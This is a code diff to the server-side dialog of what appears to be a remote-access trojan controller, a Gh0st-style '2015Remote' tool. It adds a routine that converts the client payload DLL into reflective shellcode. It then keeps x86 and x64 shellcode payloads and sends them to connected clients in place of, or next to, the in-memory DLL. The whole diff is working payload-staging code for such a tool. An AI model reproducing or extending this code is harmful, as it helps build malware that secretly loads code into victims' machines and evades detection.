@@ -178,6 +178,11 @@ CMy2015RemoteDlg::CMy2015RemoteDlg(IOCPServer* iocpServer, CWnd* pParent): CDial
 	m_bmOnline[4].LoadBitmap(IDB_BITMAP_PROXY);
 	m_bmOnline[5].LoadBitmap(IDB_BITMAP_HOSTNOTE);
 
+	for (int i = 0; i < PAYLOAD_MAXTYPE; i++) {
+		m_ServerDLL[i] = nullptr;
+		m_ServerBin[i] = nullptr;
+	}
+
 	InitializeCriticalSection(&m_cs);
 }
 
@@ -185,8 +190,10 @@ CMy2015RemoteDlg::CMy2015RemoteDlg(IOCPServer* iocpServer, CWnd* pParent): CDial
 CMy2015RemoteDlg::~CMy2015RemoteDlg()
 {
 	DeleteCriticalSection(&m_cs);
-	for (int i = 0; i < PAYLOAD_MAXTYPE; i++)
+	for (int i = 0; i < PAYLOAD_MAXTYPE; i++) {
 		SAFE_DELETE(m_ServerDLL[i]);
+		SAFE_DELETE(m_ServerBin[i]);
+	}
 }
 
 void CMy2015RemoteDlg::DoDataExchange(CDataExchange* pDX)
@@ -490,7 +497,28 @@ VOID CMy2015RemoteDlg::ShowMessage(BOOL bOk, CString strMsg)
 	m_StatusBar.SetPaneText(0,strStatusMsg);   //在状态条上显示文字
 }
 
-Buffer* ReadKernelDll(bool is64Bit) {
+BOOL ConvertToShellcode(LPVOID inBytes, DWORD length, DWORD userFunction, LPVOID userData, DWORD userLength, 
+	DWORD flags, LPSTR& outBytes, DWORD& outLength);
+
+bool MakeShellcode(LPBYTE& compressedBuffer, int& ulTotalSize, LPBYTE originBuffer, int ulOriginalLength) {
+	if (originBuffer[0] == 'M' && originBuffer[1] == 'Z') {
+		LPSTR finalShellcode = NULL;
+		DWORD finalSize;
+		if (!ConvertToShellcode(originBuffer, ulOriginalLength, NULL, NULL, 0, 0x1, finalShellcode, finalSize)) {
+			return false;
+		}
+		compressedBuffer = new BYTE[finalSize];
+		ulTotalSize = finalSize;
+
+		memcpy(compressedBuffer, finalShellcode, finalSize);
+		free(finalShellcode);
+
+		return true;
+	}
+	return false;
+}
+
+Buffer* ReadKernelDll(bool is64Bit, bool isDLL = true) {
 	BYTE* szBuffer = NULL;
 	int dwFileSize = 0;
 
@@ -513,15 +541,25 @@ Buffer* ReadKernelDll(bool is64Bit) {
 	if (pData == NULL) {
 		return NULL;
 	}
-	dwFileSize = dwSize;
+	LPBYTE srcData = (LPBYTE)pData;
+	int srcLen = dwSize;
+	if (!isDLL) { // Convert DLL -> Shell code.
+		if (!MakeShellcode(srcData, srcLen, (LPBYTE)pData, dwSize)) {
+			Mprintf("MakeShellcode failed \n");
+			return false;
+		}
+	}
+	dwFileSize = srcLen;
 	szBuffer = new BYTE[sizeof(int) + dwFileSize + 2];
 	szBuffer[0] = CMD_DLLDATA;
-	szBuffer[1] = MEMORYDLL;
+	szBuffer[1] = isDLL ? MEMORYDLL : SHELLCODE;
 	memcpy(szBuffer + 2, &dwFileSize, sizeof(int));
-	memcpy(szBuffer + 2 + sizeof(int), pData, dwFileSize);
+	memcpy(szBuffer + 2 + sizeof(int), srcData, dwFileSize);
 	// CMD_DLLDATA + SHELLCODE + dwFileSize + pData
 	auto ret = new Buffer(szBuffer, sizeof(int) + dwFileSize + 2);
 	delete[] szBuffer;
+	if (srcData != pData)
+		SAFE_DELETE_ARRAY(srcData);
 	return ret;
 }
 
@@ -557,6 +595,8 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
 	}
 	m_ServerDLL[PAYLOAD_DLL_X86] = ReadKernelDll(false);
 	m_ServerDLL[PAYLOAD_DLL_X64] = ReadKernelDll(true);
+	m_ServerBin[PAYLOAD_DLL_X86] = ReadKernelDll(false, false);
+	m_ServerBin[PAYLOAD_DLL_X64] = ReadKernelDll(true, false);
 
 	// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
 	//  执行此操作
@@ -1454,7 +1494,7 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
 		}
 		char version[12] = {};
 		ContextObject->InDeCompressedBuffer.CopyBuffer(version, 12, 4);
-		SendServerDll(ContextObject, is64Bit);
+		SendServerDll(ContextObject, typ == MEMORYDLL, is64Bit);
 		break;
 	}
 	case COMMAND_BYE: // 主机下线
@@ -1733,9 +1773,9 @@ void CMy2015RemoteDlg::SendMasterSettings(CONTEXT_OBJECT* ctx) {
 	}
 }
 
-VOID CMy2015RemoteDlg::SendServerDll(CONTEXT_OBJECT* ContextObject, bool is64Bit) {
+VOID CMy2015RemoteDlg::SendServerDll(CONTEXT_OBJECT* ContextObject, bool isDLL, bool is64Bit) {
 	auto id = is64Bit ? PAYLOAD_DLL_X64 : PAYLOAD_DLL_X86;
-	auto buf = m_ServerDLL[id];
+	auto buf = isDLL ? m_ServerDLL[id] : m_ServerBin[id];
 	if (buf->length()) {
 		m_iocpServer->OnClientPreSending(ContextObject, buf->Buf(), buf->length());
 	}
